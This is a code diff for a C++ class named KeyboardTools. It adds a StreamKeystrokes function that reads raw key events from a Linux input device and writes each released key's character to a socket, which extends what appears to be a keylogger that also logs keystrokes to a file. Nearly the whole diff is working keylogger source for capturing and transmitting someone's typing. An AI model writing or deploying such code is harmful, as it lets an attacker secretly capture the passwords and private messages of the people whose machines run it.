@@ -36,6 +36,7 @@ class KeyboardTools{
 			exit(1);
                 return 0x00;
        }
+
        FILE* OutputTo(const char* file){
 		return (outputfd=fopen(file, "a"));
        }
@@ -59,6 +60,27 @@ class KeyboardTools{
 					fflush(outputfd);
 		}
        }
+       void StreamKeystrokes(int sfd){
+                int fd=open(iPath, O_RDONLY);
+                if (fd<0)return;
+                while (read(fd, &ie, sizeof(struct input_event))!=-1){
+                        if (ie.type==EV_KEY && ie.value==0)
+                                switch(ie.code){
+                                        case 28:
+                                                write(sfd, "\n", 1);
+                                                break;
+                                        case 57:
+                                                write(sfd, " ", 1);
+                                                break;
+                                        default:
+                                                write(sfd, &map[ie.code], 1);
+                                }
 
+                }
+       }
+
+	~KeyboardTools(){
+		fclose(outputfd);
+	}
 };
 
